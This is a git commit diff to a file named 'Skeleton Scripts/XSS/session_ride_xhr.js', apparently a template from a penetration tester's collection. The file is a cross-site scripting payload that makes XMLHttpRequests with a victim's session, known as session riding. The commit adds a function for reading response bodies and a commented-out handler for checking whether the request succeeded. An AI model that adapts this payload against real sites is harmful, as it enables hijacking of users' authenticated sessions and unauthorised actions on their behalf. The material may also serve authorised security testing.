6344d4334d148ce57a54b23725c33c5f732d93af
thomas <7k45hr0@gmail.com>
2022-08-17 08:31:31 +1000

    Update session_ride_xhr.js

--- Skeleton Scripts/XSS/session_ride_xhr.js
+++ Skeleton Scripts/XSS/session_ride_xhr.js
@@ -5,8 +5,28 @@ var url = ""; // not needed if riding same domain
 var uri = "/";
 var query_string = "";
 
+function read_body(xhr) {
+    var data;
+    if (!xhr.responseType || xhr.responseType === "text") {
+        data = xhr.responseText;
+    } else if (xhr.responseType === "document") {
+        data = xhr.responseXML;
+    } else if (xhr.responseType === "json") {
+        data = xhr.responseJSON;
+    } else {
+        data = xhr.response;
+    }
+    return data;
+}
+
 function make_request() {
     xhr = new XMLHttpRequest();
+    // if you want to perform another action, use below to parse the response and validate it was successful
+    //xhr.onreadystatechange = function() {
+    //    if (xhr.readyState == XMLHttpRequest.DONE) {
+    //        console.log(read_body(xhr));
+    //    }
+    //}
     xhr.open("GET", url + uri + query_string, true);
     xhr.send(null);
 }
